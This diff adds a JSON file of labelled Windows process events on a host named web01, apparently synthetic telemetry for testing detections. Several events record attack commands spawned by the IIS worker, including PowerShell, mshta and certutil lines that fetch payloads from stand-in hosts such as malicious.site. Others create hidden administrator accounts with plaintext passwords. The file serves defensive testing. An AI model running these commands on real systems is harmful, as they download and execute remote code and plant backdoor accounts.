@@ -1,0 +1,452 @@
+[
+  {
+    "@timestamp": "2025-10-12T08:00:01Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "svchost.exe",
+      "command_line": "svchost -k netsvcs",
+      "file_path": "C:\\Windows\\System32\\svchost.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:01:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "chrome.exe",
+      "command_line": "chrome.exe https://intranet.local/dashboard",
+      "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "interactive_web_access"
+  },
+  {
+    "@timestamp": "2025-10-12T08:02:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "taskhostw.exe",
+      "command_line": "taskhostw.exe",
+      "file_path": "C:\\Windows\\System32\\taskhostw.exe",
+      "parent": {
+        "name": "wininit.exe",
+        "command_line": "wininit.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:03:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "python.exe",
+      "command_line": "python data_cleaner.py",
+      "file_path": "C:\\Python39\\python.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_script_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:04:59Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "code.exe",
+      "command_line": "code.exe",
+      "file_path": "C:\\Users\\svc_webapp\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_tool_usage"
+  },
+  {
+    "@timestamp": "2025-10-12T08:05:12Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/shell.ps1')",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent": {
+        "name": "w3wp.exe",
+        "command_line": "w3wp.exe -ap \"DefaultAppPool\""
+      }
+    },
+    "event_type": "payload_delivery"
+  },
+  {
+    "@timestamp": "2025-10-12T08:05:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "mshta.exe",
+      "command_line": "mshta http://malicious.site/shell.hta",
+      "file_path": "C:\\Windows\\System32\\mshta.exe",
+      "parent": {
+        "name": "w3wp.exe",
+        "command_line": "w3wp.exe -ap \"DefaultAppPool\""
+      }
+    },
+    "event_type": "payload_delivery"
+  },
+  {
+    "@timestamp": "2025-10-12T08:06:00Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "explorer.exe",
+      "command_line": "explorer.exe",
+      "file_path": "C:\\Windows\\explorer.exe",
+      "parent": {
+        "name": "winlogon.exe",
+        "command_line": "winlogon.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:06:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "notepad.exe",
+      "command_line": "notepad.exe",
+      "file_path": "C:\\Windows\\System32\\notepad.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_tool_usage"
+  },
+  {
+    "@timestamp": "2025-10-12T08:07:00Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "python.exe",
+      "command_line": "python generate_report.py",
+      "file_path": "C:\\Python39\\python.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_script_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:07:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "conhost.exe",
+      "command_line": "conhost.exe",
+      "file_path": "C:\\Windows\\System32\\conhost.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:08:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "cmd.exe",
+      "command_line": "cmd.exe /c wevtutil el",
+      "file_path": "C:\\Windows\\System32\\cmd.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "log_enumeration"
+  },
+  {
+    "@timestamp": "2025-10-12T08:10:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell New-LocalUser -Name tempadmin -Password (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "user_creation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:10:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell Add-LocalGroupMember -Group 'Administrators' -Member 'tempadmin'",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "privilege_escalation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:11:00Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "cmd.exe",
+      "command_line": "cmd.exe /c net user svc_temp /add",
+      "file_path": "C:\\Windows\\System32\\cmd.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "user_creation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:11:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "cmd.exe",
+      "command_line": "cmd.exe /c net localgroup administrators svc_temp /add",
+      "file_path": "C:\\Windows\\System32\\cmd.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "privilege_escalation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:11:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell -Command \"net user admin2 P@ss123 /add; net localgroup administrators admin2 /add\"",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent": {
+        "name": "w3wp.exe",
+        "command_line": "w3wp.exe -ap \"DefaultAppPool\""
+      }
+    },
+    "event_type": "user_creation_and_privilege_escalation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:11:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "wmic.exe",
+      "command_line": "wmic useraccount where name='admin2' set PasswordExpires=False",
+      "file_path": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c wmic"
+      }
+    },
+    "event_type": "account_persistence"
+  },
+  {
+    "@timestamp": "2025-10-12T08:12:00Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "net1.exe",
+      "command_line": "net1 user backupadmin Secure123! /add",
+      "file_path": "C:\\Windows\\System32\\net1.exe",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c net1"
+      }
+    },
+    "event_type": "user_creation"
+  },
+  {
+    "@timestamp": "2025-10-12T08:12:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "net1.exe",
+      "command_line": "net1 localgroup administrators backupadmin /add",
+      "file_path": "C:\\Windows\\System32\\net1.exe",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c net1"
+      }
+    },
+    "event_type": "privilege_escalation"
+  },
+    {
+    "@timestamp": "2025-10-12T08:00:01Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "svchost.exe",
+      "command_line": "svchost -k netsvcs",
+      "file_path": "C:\\Windows\\System32\\svchost.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:01:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "chrome.exe",
+      "command_line": "chrome.exe https://intranet.local/dashboard",
+      "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "interactive_web_access"
+  },
+  {
+    "@timestamp": "2025-10-12T08:02:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "taskhostw.exe",
+      "command_line": "taskhostw.exe",
+      "file_path": "C:\\Windows\\System32\\taskhostw.exe",
+      "parent": {
+        "name": "wininit.exe",
+        "command_line": "wininit.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:03:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "python.exe",
+      "command_line": "python data_cleaner.py",
+      "file_path": "C:\\Python39\\python.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_script_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:04:59Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "code.exe",
+      "command_line": "code.exe",
+      "file_path": "C:\\Users\\svc_webapp\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_tool_usage"
+  },
+  {
+    "@timestamp": "2025-10-12T08:05:12Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "certutil.exe",
+      "command_line": "certutil -urlcache -f http://malicious.site/payload.exe payload.exe",
+      "file_path": "C:\\Windows\\System32\\certutil.exe",
+      "parent": {
+        "name": "w3wp.exe",
+        "command_line": "w3wp.exe -ap \"DefaultAppPool\""
+      }
+    },
+    "event_type": "payload_delivery"
+  },
+  {
+    "@timestamp": "2025-10-12T08:05:15Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "certutil.exe",
+      "command_line": "certutil -f -urlcache http://evil.example.com/dropper.bin dropper.bin",
+      "file_path": "C:\\Windows\\System32\\certutil.exe",
+      "parent": {
+        "name": "w3wp.exe",
+        "command_line": "w3wp.exe -ap \"DefaultAppPool\""
+      }
+    },
+    "event_type": "payload_delivery"
+  },
+  {
+    "@timestamp": "2025-10-12T08:06:00Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "explorer.exe",
+      "command_line": "explorer.exe",
+      "file_path": "C:\\Windows\\explorer.exe",
+      "parent": {
+        "name": "winlogon.exe",
+        "command_line": "winlogon.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  },
+  {
+    "@timestamp": "2025-10-12T08:06:30Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "notepad.exe",
+      "command_line": "notepad.exe",
+      "file_path": "C:\\Windows\\System32\\notepad.exe",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "explorer.exe"
+      }
+    },
+    "event_type": "benign_tool_usage"
+  },
+  {
+    "@timestamp": "2025-10-12T08:07:45Z",
+    "computer_name": "web01",
+    "user": { "name": "svc_webapp" },
+    "process": {
+      "name": "conhost.exe",
+      "command_line": "conhost.exe",
+      "file_path": "C:\\Windows\\System32\\conhost.exe",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "services.exe"
+      }
+    },
+    "event_type": "benign_execution"
+  }
+]
